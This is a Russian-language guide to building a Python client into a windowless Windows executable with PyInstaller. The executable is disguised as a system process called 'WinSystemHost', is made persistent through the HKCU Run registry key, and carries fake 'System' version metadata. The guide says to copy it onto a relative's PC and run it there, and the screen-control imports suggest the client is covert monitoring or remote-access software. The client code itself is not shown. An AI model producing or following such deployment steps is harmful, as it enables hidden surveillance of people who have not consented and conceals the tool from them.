# =============================================================================
# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ CLIENT В EXE
# =============================================================================

## Шаг 1: Установка PyInstaller

```bash
pip install pyinstaller
```

## Шаг 2: Компиляция

Выполните следующую команду в терминале:

```bash
pyinstaller --onefile --windowed --name=WinSystemHost --icon=NONE client.py
```

### Параметры:
- `--onefile` - создаёт один exe-файл (без внешних библиотек)
- `--windowed` или `-w` - запускается без консольного окна (фоновый режим)
- `--name=WinSystemHost` - имя exe-файла будет WinSystemHost.exe
- `--icon=NONE` - без иконки (можно добавить свою через --icon=путь.ico)

## Шаг 3: Результат

После компиляции появится папка `dist`, в которой будет файл:
```
dist/WinSystemHost.exe
```

## Шаг 4: Запуск

Скопируйте `WinSystemHost.exe` на ПК родственника и запустите.
Программа:
1. Добавится в автозапуск (реестр HKCU\Run)
2. Будет работать в фоновом режиме (без окна консоли)
3. Называется в диспетчере задач как WinSystemHost

## Проверка автозапуска

После первого запуска можете проверить реестр:
1. Нажмите Win + R
2. Введите: `regedit`
3. Перейдите: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
4. Там должен быть ключ `WinSystemHost` с путём к exe-файлу

## Удаление из автозапуска

Чтобы удалить из автозапуска, удалите ключ реестра:
```python
import winreg
key = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_WRITE
)
winreg.DeleteValue(key, "WinSystemHost")
winreg.CloseKey(key)
```

## Дополнительные опции PyInstaller

### Скрытый импорт (если pyautogui не работает в exe)
```bash
pyinstaller --onefile --windowed --name=WinSystemHost --hidden-import=pyautogui --hidden-import=PIL client.py
```

### Указание версии (для информации в exe)
```bash
pyinstaller --onefile --windowed --name=WinSystemHost --version-file=version_info.txt client.py
```

Где version_info.txt:
```
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1,0,0,0),
    prodvers=(1,0,0,0),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
        StringTable(
          u'040904E4',
          [
            StringStruct(u'FileVersion', u'1.0.0.0'),
            StringStruct(u'ProductName', u'WinSystemHost'),
            StringStruct(u'CompanyName', u'System'),
            StringStruct(u'LegalCopyright', u'System')
          ]
        )
      ]
    )
  ]
)
```